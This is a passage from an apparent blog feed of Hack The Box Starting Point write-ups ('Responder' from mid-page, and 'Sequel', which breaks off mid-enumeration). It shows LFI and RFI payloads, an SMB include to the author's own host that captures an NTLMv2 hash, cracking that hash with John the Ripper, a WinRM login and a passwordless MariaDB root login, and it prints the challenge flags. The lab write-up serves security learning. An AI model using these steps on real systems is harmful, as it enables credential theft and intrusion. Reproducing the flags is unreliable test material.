<h4 id="which-of-the-following-values-for-the-page-parameter-would-be-an-example-of-exploiting-a-local-file-include-lfi-vulnerability-frenchhtml-1010146somefile-windowssystem32driversetchosts-minikatzexe">Which of the following values for the <code>page</code> parameter would be an example of exploiting a Local File Include (LFI) Vulnerability: &ldquo;french.html&rdquo;, &ldquo;//10.10.14.6/somefile&rdquo;, &ldquo;../../../../../../../../windows/system32/drivers/etc/hosts&rdquo;, &ldquo;minikatz.exe&rdquo;</h4>






<pre tabindex="0"><code>../../../../../../../../windows/system32/drivers/etc/hosts</code></pre>
<br>
<h4 id="which-of-the-following-values-for-the-page-parameter-would-be-an-example-of-exploiting-a-remote-file-include-rfi-vulnerability-frenchhtml-1010146somefile-windowssystem32driversetchosts-minikatzexe">Which of the following values for the <code>page</code> parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: &ldquo;french.html&rdquo;, &ldquo;//10.10.14.6/somefile&rdquo;, &ldquo;../../../../../../../../windows/system32/drivers/etc/hosts&rdquo;, &ldquo;minikatz.exe&rdquo;</h4>






<pre tabindex="0"><code>//10.10.14.6/somefile</code></pre>
<p>LFI or Local File Inclusion occurs when an attacker is able to get a website to include a file that was not intended to be an option for this application. A common examples is when an application uses the path to a file as input. If the applications treats this input as trusted, and the required sanitary checks are not performed on this input, then the attacker can exploit it by using the <code>../</code> string in the inputted file name and eventually view sensitive files in the local file system.</p>
<p>RFI or Remote File Inclusion is similar to LFI but in this case it is possible for an attacker to load a remote file on the host using protocols like HTTP, FTC, etc.</p>
<br>
<h4 id="what-does-ntlm-stand-for">What does NTLM stand for?</h4>






<pre tabindex="0"><code>New Technology LAN Manager</code></pre>
<p>NTLM is a collection of authentication protocols created by Microsoft. It is a challenge-response authentication protocol used to authenticate a client to a resource on an Active Directory domain.</p>
<br>
<h4 id="which-flag-do-we-use-in-the-responder-utility-to-specfiy-the-network-interface">Which flag do we use in the Responder utility to specfiy the network interface?</h4>






<pre tabindex="0"><code>-I</code></pre>
<p><img src="image-5.png#center" alt="alt text"></p>
<br>
<p>We just saw that <code>LFI</code> is possible as we can view the contents of the <code>C:\windows\system32\drivers\etc\hosts</code> file in the response.
The file inclusion was made possible because in the backend the <code>include()</code> method of PHP is being used to process the URL parameter <code>page</code> for serving a different webpage for different languages.</p>
<p>In the PHP configuration file <code>php.ini</code>, &ldquo;allow_url_include&rdquo; wrapper is set to &ldquo;Off&rdquo; by default, indicating that PHP does not load remote HTTP or FTP URLs to prevent remote file inclusion attacks. However, even if <code>allow_url_include</code> and <code>allow_url_fopen</code> are set to &ldquo;Off&rdquo;, PHP will not prevent the loading of SMB URLs. In our case, we can misuse this functionality to steal the NTLM hash.</p>
<p>Verify that the <code>Responder.conf</code> is sent to listen for SMB requests. With the configuration file ready, we can proceed to start Responder with <code>python3</code>, passing in the interface to listen on using the <code>-I</code> flag.</p>
<p><img src="image-6.png#center" alt="alt text"></p>
<br>
<p>Starting Responder by running the following command: <code>sudo python3 Responder.py -I tun0</code></p>
<p><img src="image-7.png#center" alt="alt text"></p>
<br>
<p>With the Responder server ready, we tell the server to include a resource from our SMB server by setting the <code>page</code> parameter as follows via the web browser.</p>
<p><code>http://unika.htb/?page=//10.10.14.28/somefile</code></p>
<p><img src="image-8.png#center" alt="alt text"></p>
<br>
<p>Now we let&rsquo;s crack the hash using the John the Ripper.</p>
<br>
<h4 id="there-are-several-tools-that-take-a-netntlmv2-challengeresponse-and-try-millions-of-passwords-to-see-if-any-of-them-generate-the-same-response-one-such-tool-is-often-referred-to-as-john-but-the-full-name-is-what">There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as &lsquo;john&rsquo;, but the full name is what?</h4>






<pre tabindex="0"><code>John the Ripper</code></pre>
<br>
<h4 id="what-is-the-password-for-the-administrator-user">What is the password for the administrator user?</h4>






<pre tabindex="0"><code>badminton</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>$ <span style="color:#89dceb">echo</span> <span style="color:#a6e3a1">&#34;Administrator::RESPONDER:8a9c5ae98bb0afe8:B5337356E784F427FCA011E764465155:010100000000000000091E577FD5DA01F2AE6AA5DEA6
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span><span style="color:#a6e3a1">0C990000000002000800430044005500380001001E00570049004E002D0058004F004100460043004F0052005500550049004A0004003400570049004E002D005
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span><span style="color:#a6e3a1">8004F004100460043004F0052005500550049004A002E0043004400550038002E004C004F00430041004C000300140043004400550038002E004C004F00430041
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span><span style="color:#a6e3a1">004C000500140043004400550038002E004C004F00430041004C000700080000091E577FD5DA01060004000200000008003000300000000000000001000000002
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span><span style="color:#a6e3a1">0000031C85E41ABB6A4BB8A30F1CF440450559198FFDF38BC3047031571CB1CA793290A0010000000000000000000000000000000000009002000630069006600
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span><span style="color:#a6e3a1">73002F00310030002E00310030002E00310034002E00320038000000000000000000&#34;</span> &gt; hash.txt</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ john -w<span style="color:#89dceb;font-weight:bold">=</span>/usr/share/wordlists/rockyou.txt hash.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Using default input encoding: UTF-8
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Loaded <span style="color:#fab387">1</span> password <span style="color:#89dceb">hash</span> <span style="color:#89dceb;font-weight:bold">(</span>netntlmv2, NTLMv2 C/R <span style="color:#89dceb;font-weight:bold">[</span>MD4 HMAC-MD5 32/64<span style="color:#89dceb;font-weight:bold">])</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Will run <span style="color:#fab387">2</span> OpenMP threads
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Press <span style="color:#a6e3a1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#cba6f7">for</span> status
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>badminton        <span style="color:#89dceb;font-weight:bold">(</span>Administrator<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>1g 0:00:00:00 DONE <span style="color:#89dceb;font-weight:bold">(</span>2024-07-14 00:02<span style="color:#89dceb;font-weight:bold">)</span> 100.0g/s 819200p/s 819200c/s 819200C/s 123456..whitetiger
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Use the <span style="color:#a6e3a1">&#34;--show --format=netntlmv2&#34;</span> options to display all of the cracked passwords reliably
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>Session completed.</span></span></code></pre></div>
<br>
<h4 id="well-use-a-window-service-ie-running-on-the-box-to-remotely-across-the-responder-machine-using-the-password-we-recovered-what-port-tcp-does-it-listen-on">We&rsquo;ll use a Window service (i.e. running on the box) to remotely across the Responder machine using the password we recovered. What port TCP does it listen on?</h4>






<pre tabindex="0"><code>5985</code></pre>
<p><img src="image-9.png#center" alt="alt text"></p>
<br>
<h4 id="submit-root-flag">Submit root flag</h4>






<pre tabindex="0"><code>ea81b7afddd03efaa0945333ed147fac</code></pre>
<p>We will connect to the WinRM service on the target and try to get a session. Because Powershell isn&rsquo;t installed on Linux by default, we&rsquo;ll use a tool called <code>Evil-WinRM</code>.</p>
<p><code>evil-winrm -i 10.129.172.140 -u administrator -p badminton</code></p>
<p><img src="image-10.png#center" alt="alt text"></p>
<br>
<p><img src="image-11.png" alt="alt text"></p>
]]></content:encoded>
    </item>
    <item>
      <title>[HTB] Sequel</title>
      <link>http://localhost:1313/htb-sequel/</link>
      <pubDate>Fri, 12 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/htb-sequel/</guid>
      <description>During our scan, which port do we find serving MySQL? 3306 1[us-starting-point-vip-1-dhcp][10.10.14.28][leewookb@htb-0x7zvm1bat][~] 2 []$ nmap -sC -sV 10.129.50.55 -p- 3Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-11 23:56 CDT 4Nmap scan report for 10.129.50.55 5Host is up (0.0084s latency). 6Not shown: 65534 closed tcp ports (reset) 7PORT STATE SERVICE VERSION 83306/tcp open mysql? 9| mysql-info: 10| Protocol: 10 11| Version: 5.5.5-10.3.27-MariaDB-0+deb10u1 12| Thread ID: 66 13| Capabilities flags: 63486 14| Some Capabilities: Speaks41ProtocolOld, Support41Auth, SupportsTransactions, SupportsCompression, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, InteractiveClient, Speaks41ProtocolNew, ConnectWithDatabase, FoundRows, SupportsLoadDataLocal, ODBCClient, DontAllowDatabaseTableColumn, LongColumnFlag, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults 15| Status: Autocommit 16| Salt: 6&amp;#39;\|}}|xdny7D0ay_OOz 17|_ Auth Plugin Name: mysql_native_password 18 19Service detection performed.</description>
      <content:encoded><![CDATA[<h4 id="during-our-scan-which-port-do-we-find-serving-mysql">During our scan, which port do we find serving MySQL?</h4>






<pre tabindex="0"><code>3306</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>10.10.14.28<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-0x7zvm1bat<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span> <span style="color:#89dceb;font-weight:bold">[</span><span style="color:#89dceb;font-weight:bold">]</span>$ nmap -sC -sV 10.129.50.55 -p-
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Starting Nmap 7.94SVN <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2024-07-11 23:56 CDT
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Nmap scan report <span style="color:#cba6f7">for</span> 10.129.50.55
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.0084s latency<span style="color:#89dceb;font-weight:bold">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Not shown: <span style="color:#fab387">65534</span> closed tcp ports <span style="color:#89dceb;font-weight:bold">(</span>reset<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>PORT     STATE SERVICE VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>3306/tcp open  mysql?
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>| mysql-info:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>|   Protocol: <span style="color:#fab387">10</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>|   Thread ID: <span style="color:#fab387">66</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>|   Capabilities flags: <span style="color:#fab387">63486</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>|   Some Capabilities: Speaks41ProtocolOld, Support41Auth, SupportsTransactions, SupportsCompression, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, InteractiveClient, Speaks41ProtocolNew, ConnectWithDatabase, FoundRows, SupportsLoadDataLocal, ODBCClient, DontAllowDatabaseTableColumn, LongColumnFlag, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>|   Status: Autocommit
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>|   Salt: 6<span style="color:#f38ba8">&#39;</span><span style="color:#89b4fa">\|</span><span style="color:#89dceb;font-weight:bold">}}</span>|xdny7D0ay_OOz
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>|_  Auth Plugin Name: mysql_native_password
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>Nmap <span style="color:#cba6f7">done</span>: <span style="color:#fab387">1</span> IP address <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">1</span> host up<span style="color:#89dceb;font-weight:bold">)</span> scanned in 204.84 seconds</span></span></code></pre></div>
<br>
<h4 id="what-community-developed-mysql-version-is-the-target-running">What community-developed MySQL version is the target running?</h4>






<pre tabindex="0"><code>MariaDB</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>| mysql-info:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>|   Protocol: <span style="color:#fab387">10</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>|   Thread ID: <span style="color:#fab387">66</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>|   Capabilities flags: <span style="color:#fab387">63486</span></span></span></code></pre></div>
<br>
<h4 id="when-using-the-mysql-command-line-client-what-switch-do-we-need-to-use-in-order-to-specify-a-login-username">When using the MySQL command line client, what switch do we need to use in order to specify a login username?</h4>






<pre tabindex="0"><code>-U</code></pre>
<p>The option could be found by the <code>mysql --help</code> command</p>
<p><img src="image.png#center" alt="alt text"></p>
<br>
<h4 id="which-username-allows-us-to-log-into-this-mariadb-instance-without-providing-a-password">Which username allows us to log into this MariaDB instance without providing a password?</h4>






<pre tabindex="0"><code>root</code></pre>
<p>I attempted to login as root without password and it was accepted.</p>
<p><code>mysql -h {target IP address} -u {username}</code></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>10.10.14.28<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-0x7zvm1bat<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span> <span style="color:#89dceb;font-weight:bold">[</span><span style="color:#89dceb;font-weight:bold">]</span>$ mysql -h 10.129.50.55 -u root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Welcome to the MariaDB monitor.  Commands end with ; or <span style="color:#89b4fa">\g</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Your MariaDB connection id is <span style="color:#fab387">74</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Server version: 10.3.27-MariaDB-0+deb10u1 Debian <span style="color:#fab387">10</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Copyright <span style="color:#89dceb;font-weight:bold">(</span>c<span style="color:#89dceb;font-weight:bold">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Type <span style="color:#a6e3a1">&#39;help;&#39;</span> or <span style="color:#a6e3a1">&#39;\h&#39;</span> <span style="color:#cba6f7">for</span> help. Type <span style="color:#a6e3a1">&#39;\c&#39;</span> to clear the current input statement.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>MariaDB <span style="color:#89dceb;font-weight:bold">[(</span>none<span style="color:#89dceb;font-weight:bold">)]</span>&gt;</span></span></code></pre></div>
<br>
<h4 id="in-sql-what-symbol-can-we-use-to-specify-within-the-query-that-we-want-to-display-everything-inside-a-table">In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?</h4>






<pre tabindex="0"><code>*</code></pre>
<p><code>*</code> the asterisk symbol is used to display everything (all columns) inside a table.</p>
<p>For example, <code>SELECT * FROM {table_name}</code></p>
<br>
<h4 id="in-sql-what-symbol-do-we-need-to-end-each-query-with">In SQL, what symbol do we need to end each query with?</h4>






<pre tabindex="0"><code>;</code></pre>
<p>in SQL, we specify <code>;</code>, the semicolon to end each query, just like we end every line with the semicolon when programming in Javascript.</p>
<br>
<h4 id="there-are-three-databases-in-this-mysql-instance-that-are-common-across-all-mysql-instances-what-is-the-name-of-the-fourth-thats-unique-to-this-host">There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that&rsquo;s unique to this host?</h4>






<pre tabindex="0"><code>htb</code></pre>
<p><code>SHOW DATABSES</code> command listed all the databases in the MySQL instance and <code>htb</code> is the unique one to the host.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>MariaDB [(<span style="color:#cba6f7">none</span>)]<span style="color:#89dceb;font-weight:bold">&gt;</span> <span style="color:#cba6f7">SHOW</span> DATABASES;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span><span style="color:#89dceb;font-weight:bold">+</span><span style="color:#6c7086;font-style:italic">--------------------+
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span><span style="color:#6c7086;font-style:italic"></span><span style="color:#89dceb;font-weight:bold">|</span> <span style="color:#cba6f7">Database</span>           <span style="color:#89dceb;font-weight:bold">|</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span><span style="color:#89dceb;font-weight:bold">+</span><span style="color:#6c7086;font-style:italic">--------------------+
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span><span style="color:#6c7086;font-style:italic"></span><span style="color:#89dceb;font-weight:bold">|</span> htb                <span style="color:#89dceb;font-weight:bold">|</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span><span style="color:#89dceb;font-weight:bold">|</span> information_schema <span style="color:#89dceb;font-weight:bold">|</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span><span style="color:#89dceb;font-weight:bold">|</span> mysql              <span style="color:#89dceb;font-weight:bold">|</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">8</span><span><span style="color:#89dceb;font-weight:bold">|</span> performance_schema <span style="color:#89dceb;font-weight:bold">|</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">9</span><span><span style="color:#89dceb;font-weight:bold">+</span><span style="color:#6c7086;font-style:italic">--------------------+</span></span></span></code></pre></div>
<br>
<h4 id="submit-root-flag">Submit root flag</h4>






<pre tabindex="0"><code>7b4bec00d1a39e3dd4e021ec3d915da8</code></pre>
<p>since I know the database that I&rsquo;m interested in is the <code>htb</code> database, I ran <code>use htb</code> command to change the database to htb.
Then listed the tables belonged to the db by <code>show tables</code></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>MariaDB [(<span style="color:#cba6f7">none</span>)]<span style="color:#89dceb;font-weight:bold">&gt;</span> use htb
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>Reading <span style="color:#cba6f7">table</span> information <span style="color:#cba6f7">for</span> <span style="color:#cba6f7">completion</span> <span style="color:#cba6f7">of</span> <span style="color:#cba6f7">table</span> <span style="color:#cba6f7">and</span> <span style="color:#cba6f7">column</span> <span style="color:#cba6f7">names</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>You can turn <span style="color:#cba6f7">off</span> this feature <span style="color:#cba6f7">to</span> <span style="color:#cba6f7">get</span> a quicker startup <span style="color:#cba6f7">with</span> <span style="color:#89dceb;font-weight:bold">-</span>A
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#cba6f7">Database</span> changed
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>MariaDB [htb]<span style="color:#89dceb;font-weight:bold">&gt;</span> <span style="color:#cba6f7">show</span> tables;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#89dceb;font-weight:bold">+</span><span style="color:#6c7086;font-style:italic">---------------+
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#6c7086;font-style:italic"></span><span style="color:#89dceb;font-weight:bold">|</span> Tables_in_htb <span style="color:#89dceb;font-weight:bold">|</span>
